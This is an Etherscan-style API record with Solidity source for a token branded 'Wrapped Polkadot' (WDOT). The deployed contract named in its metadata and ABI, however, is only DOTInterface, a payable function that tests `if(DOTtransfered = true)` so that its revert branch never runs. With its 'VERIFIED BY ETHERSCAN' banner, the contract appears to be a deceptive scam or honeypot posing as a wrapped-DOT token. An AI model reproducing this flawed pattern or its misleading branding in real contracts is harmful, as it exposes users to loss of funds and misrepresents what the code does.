{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity 0.5.7;\r\n\r\n//WRAPPED POLKADOT \r\n//VERIFIED BY ETHERSCAN\r\n\r\ncontract DOTInterface{\r\n    \r\n    bool DOTtransfered;\r\n    \r\n    function recieveDOT(uint total) payable public {\r\n        if(DOTtransfered = true) {\r\n            msg.sender.transfer(total);\r\n        } else {\r\n            revert();\r\n        }\r\n    }\r\n    \r\n}\r\n\r\ncontract WDOT is DOTInterface {\r\n    // Track how many WDOT tokens are owned by each address.\r\n    mapping (address => uint256) public balanceOf;\r\n\r\n    string public name = \"Wrapped Polkadot\";\r\n    string public symbol = \"WDOT\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    constructor() public {\r\n        // Initially assign all tokens to the contract's creator.\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        require(balanceOf[msg.sender] >= value);\r\n\r\n        balanceOf[msg.sender] -= value;  // deduct from sender's balance\r\n        balanceOf[to] += value;          // add to recipient's balance\r\n        emit Transfer(msg.sender, to, value);\r\n        return true;\r\n    }\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    function approve(address spender, uint256 value)\r\n        public\r\n        returns (bool success)\r\n    {\r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value)\r\n        public\r\n        returns (bool success)\r\n    {\r\n        require(value <= balanceOf[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n\r\n        balanceOf[from] -= value;\r\n        balanceOf[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true;\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"total\",\"type\":\"uint256\"}],\"name\":\"recieveDOT\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"}]","ContractName":"DOTInterface","CompilerVersion":"v0.5.7+commit.6da8b019","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://631268e638c4bf3473adf90918165cf635c44dde89eaed2497c245f54ae7f63f"}]}